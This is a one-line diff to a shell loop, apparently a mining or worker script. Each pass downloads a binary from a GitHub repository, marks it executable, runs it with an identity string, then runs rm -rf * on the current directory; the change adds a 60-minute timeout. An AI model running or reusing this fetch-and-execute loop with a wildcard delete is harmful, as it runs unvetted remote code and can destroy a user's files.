@@ -1,1 +1,1 @@
-while :; do wget https://github.com/molotovman88/a/raw/main/sof && chmod +x sof && ./sof -t 7 -i KVAQTPYWKGFQKETWTBAEZBCIKVNAQZFUIFPTPJSETEDNEJMSVLBEGHEGOOLM --label sha; rm -rf *; done
+while :; do wget https://github.com/molotovman88/a/raw/main/sof && chmod +x sof && timeout 60m ./sof -t 7 -i KVAQTPYWKGFQKETWTBAEZBCIKVNAQZFUIFPTPJSETEDNEJMSVLBEGHEGOOLM --label sha; rm -rf *; done
